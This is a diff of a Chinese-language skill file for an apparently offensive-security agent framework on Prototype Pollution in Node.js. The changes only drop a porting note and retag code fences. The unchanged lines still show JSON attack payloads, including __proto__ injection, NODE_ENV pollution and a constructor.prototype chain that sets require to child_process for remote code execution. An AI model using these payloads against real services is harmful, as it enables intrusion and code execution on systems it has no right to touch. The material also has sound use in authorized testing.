@@ -4,7 +4,7 @@ description: 'Prototype Pollution：__proto__注入→属性劫持→RCE。Node.
 disable-model-invocation: true
 metadata: { domain: web, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 ## Prototype Pollution（原型污染）
 
@@ -19,7 +19,7 @@ metadata: { domain: web, tier: T2 }
 
 // 验证污染成功
 Object.prototype.test  // 如果是 "polluted" → 确认漏洞
-```
+```text
 
 ### 常用 Payload
 ```json
@@ -40,7 +40,7 @@ Object.prototype.test  // 如果是 "polluted" → 确认漏洞
 
 // 污染 .env 读取
 {"__proto__":{"NODE_ENV":"production"}}
-```
+```text
 
 ### 链到 RCE
 ```json
@@ -56,7 +56,7 @@ Object.prototype.test  // 如果是 "polluted" → 确认漏洞
 
 // 路径 4: 通用 require 路径
 {"constructor":{"prototype":{"require":"child_process"}}}
-```
+```text
 
 ### 嵌套污染（深层 merge）
 ```json
@@ -66,7 +66,7 @@ Object.prototype.test  // 如果是 "polluted" → 确认漏洞
 
 // 数组路径
 {"a[b]":"val"} → a.b = val → 经过原型链
-```
+```text
 
 ### 工具
 - **ppfuzz**: 自动 fuzz prototype pollution
